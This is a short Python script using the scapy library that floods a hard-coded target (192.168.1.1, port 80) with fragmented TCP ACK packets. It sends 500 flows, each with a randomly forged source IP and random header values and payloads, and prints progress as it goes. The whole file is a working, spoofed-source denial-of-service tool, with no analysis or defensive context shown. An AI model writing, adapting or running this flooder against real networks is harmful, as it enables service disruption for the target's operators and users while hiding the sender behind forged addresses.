from scapy.all import *
import random
import time
import struct

TARGET_IP = "192.168.1.1"
TARGET_PORT = 80
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting ACK Fragmentation -> {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip  = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    sport   = random.randint(1024, 65535)
    ttl     = random.randint(32, 128)
    window  = random.choice([1024, 2048, 4096, 8192, 16384, 65535])
    seq     = random.randint(0, 2**32 - 1)
    ack_num = random.randint(0, 2**32 - 1)
    flow_id = random.randint(1, 65535)     # shared IP ID per flow
    packets = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow payload size — large enough to fragment
    size_min = random.randint(300, 600)
    size_max = random.randint(size_min + 200, 3000)

    # Per-flow fragment size — multiple of 8
    raw_frag  = random.randint(48, 512)
    frag_size = (raw_frag // 8) * 8
    frag_size = max(frag_size, 48)

    # Per-flow IAT profile
    iat_min  = random.uniform(0.0001, 0.005)
    iat_max  = random.uniform(iat_min + 0.001, 0.05)

    for p in range(packets):
        # Build TCP ACK header manually (20 bytes minimum)
        # flags = ACK (0x010)
        payload_size = random.randint(size_min, size_max)
        tcp_payload  = bytes([random.randint(0, 255) for _ in range(payload_size)])

        # Manual TCP header — 20 bytes
        # sport, dport, seq, ack, offset+flags, window, checksum, urgent
        tcp_header = struct.pack("!HHIIBBHHH",
            sport,                      # source port
            TARGET_PORT,                # dest port
            (seq + p) & 0xFFFFFFFF,     # sequence number
            ack_num,                    # ack number
            0x50,                       # data offset (5 * 4 = 20 bytes)
            0x10,                       # flags = ACK
            window,                     # window size
            0,                          # checksum (0 = not computed)
            0                           # urgent pointer
        )
        tcp_data = tcp_header + tcp_payload

        # Fragment the TCP ACK datagram
        offset = 0
        frags  = []
        while offset < len(tcp_data):
            chunk   = tcp_data[offset: offset + frag_size]
            is_last = (offset + frag_size) >= len(tcp_data)

            frag_pkt = IP(
                src   = src_ip,
                dst   = TARGET_IP,
                ttl   = ttl,
                proto = 6,                      # TCP protocol number
                id    = flow_id,                # shared across fragments
                flags = 0 if is_last else 1,    # MF flag
                frag  = offset // 8             # offset in 8-byte units
            ) / Raw(load=chunk)

            frags.append(frag_pkt)
            offset += frag_size

        # Send all fragments
        send(frags, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")